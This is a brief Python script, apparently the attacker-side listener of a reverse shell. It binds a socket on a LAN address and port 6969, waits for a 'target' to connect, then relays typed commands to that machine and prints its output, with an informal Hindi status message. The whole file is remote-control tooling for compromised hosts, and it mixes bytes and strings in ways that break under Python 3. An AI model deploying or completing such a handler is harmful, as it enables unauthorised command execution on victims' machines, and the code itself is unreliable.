#!/usr/bin/python
import socket
import json  #to dump data  bytes as much  we want

def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + target.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def shell():
        while True:
                command = input("*shell#~%s: " %str(ip))
                #message = bytes(message,'utf-8')
                reliable_send(bytes(command,'utf-8'))
                if command =="q":
                        break
                else:
                        result = reliable_recv()
                        print(result)


def server():
        global s
        global ip
        global target

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #setting up connection
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        s.bind(("192.168.29.126",6969)) #local host ip add
        s.listen(5) #can listen 5 connections
        print("Sun raha hai na tu")
        target, ip = s.accept()
        print("Target connected")

server()
shell()
s.close()
